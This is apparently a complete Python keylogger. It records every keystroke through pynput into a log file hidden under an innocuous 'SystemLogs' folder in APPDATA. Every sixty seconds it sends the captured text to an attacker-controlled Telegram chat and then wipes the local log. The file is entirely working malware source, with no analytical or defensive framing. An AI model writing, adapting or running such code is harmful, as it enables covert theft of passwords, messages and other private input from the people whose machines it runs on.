import os
import sys
import time
import asyncio
import threading
from datetime import datetime
from pynput import keyboard
from telegram import Bot
from telegram.error import TelegramError
from dotenv import load_dotenv

# ===== Configuration =====
load_dotenv()

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
TELEGRAM_CHAT_ID = os.getenv("TELEGRAM_CHAT_ID")
LOG_FILE = os.path.join(os.getenv('APPDATA'), 'SystemLogs', 'keys.log')
SEND_INTERVAL = 60  # in seconds

class KeyLogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self.buffer = ""
        self.lock = threading.Lock()

        log_dir = os.path.dirname(self.file_path)
        os.makedirs(log_dir, exist_ok=True)

    def _write_key(self, key):
        key_str = str(key).replace("'", "")
        end_keys = {"Key.enter", "Key.space", "Key.backspace", "Key.delete"}

        with self.lock:
            if key_str in end_keys:
                # Записать строку с меткой времени
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(self.file_path, "a", encoding="utf-8") as f:
                    f.write(f"{timestamp} {self.buffer.strip()}[{key_str[4:]}]\n")
                    f.flush()
                self.buffer = ""
            else:
                if key_str.startswith("Key."):
                    key_str = f"[{key_str[4:]}]"
                self.buffer += key_str

    def start(self):
        listener = keyboard.Listener(on_press=self._write_key)
        listener.start()

async def send_to_telegram():
    if not os.path.exists(LOG_FILE):
        return

    try:
        with open(LOG_FILE, "r+", encoding="utf-8") as f:
            content = f.read()
            if not content.strip():
                return

            if len(content) > 4000:
                content = content[-4000:]

            bot = Bot(token=TELEGRAM_BOT_TOKEN)
            await bot.send_message(
                chat_id=TELEGRAM_CHAT_ID,
                text=f"🪪 Keylogger Logs:\n\n{content}",
                parse_mode="HTML"
            )
            f.seek(0)
            f.truncate()
    except TelegramError as e:
        print(f"Telegram error: {e}")
    except Exception as e:
        print(f"Error sending logs: {e}")

async def scheduler():
    while True:
        await send_to_telegram()
        await asyncio.sleep(SEND_INTERVAL)

async def main_async():
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("Missing Telegram configuration.")
        return

    keylogger = KeyLogger(LOG_FILE)
    keylogger.start()

    await scheduler()

def main():
    asyncio.run(main_async())

if __name__ == "__main__":
    main()
    